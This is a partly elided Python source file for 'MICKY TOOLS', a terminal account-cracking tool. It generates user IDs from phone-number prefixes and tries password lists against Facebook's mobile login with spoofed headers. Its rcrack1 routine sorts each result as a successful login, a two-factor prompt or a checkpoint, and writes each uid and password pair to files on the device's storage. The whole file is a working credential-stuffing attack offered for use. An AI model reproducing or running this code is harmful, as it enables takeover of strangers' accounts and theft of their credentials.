...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; M I C K Y \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
\x1b[97;1m  ╔═══════════════════════════════════════════════════╗
\x1b[97;1m  ║      [\033[38;5;196m+\x1b[97;1m] \x1b[97;1mWELCOME TO MICKY TOOLS\x1b[97;1m  [\033[38;5;196m+\x1b[97;1m]           ║
\x1b[97;1m  ╠═════════\033[38;5;196mo00\x1b[97;1m═════════════\033[38;5;196m〄\x1b[97;1m═══════════\033[38;5;196m00o\x1b[97;1m══════════╣
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mName     : \x1b[97;1mM I C K Y  \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mGithub   : \x1b[97;1mhttps://github.com/PRIVATE    \x1b[97;1m║
\x1b[97;1m  ║\x1b[97;1m [\033[38;5;196m•\x1b[97;1m] \033[38;5;46mWhatsapp : \x1b[97;1m+9232757*****                     \x1b[97;1m║
...
def num():
    ...
    os.system('clear')
    print(logo)
    print('  [+] EXAMPLE : 0318, 0306, 0345, 0335 ')
    print("\033[0m  𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙𐦙")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r [\033[38;5;46mMīīɕʞɣ\033[1;97m] [\033[38;5;45m%s\033[0m/%s] [OK\033[1;97m:-\033[38;5;46m%s\033[1;97m] [CP\033[1;97m:-\033[38;5;196m%s\033[1;97m] [2F\033[1;97m:-\033[38;5;45m%s\033[1;97m] \r'%(loop,tl,len(ok),len(cp),len(twf))),
            sys.stdout.flush()
    ...
    'referer': 'https://m.facebook.com/?stype=lo&jlou=AffNHiEkem8kLgwWBIW3EFsu0vpg8RpRucM-p4NArG2I4LkBRWRd2GIJQ20-jmC9DxOZCAsAnG5MBoQ50ID8tvOP8QKWbPNraeqicU3CML1sqg&smuh=52779&lh=Ac8j6v9a_PfzQcLalAQ&refid=7&ref_component=mbasic_footer&_rdr',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',}
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/MICKY-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/MICKY-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    print(f'\r\x1b[38;5;191m[CP] [💔] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcard/MICKY-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f' \r\033[m[Mīīɕʞɣ] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
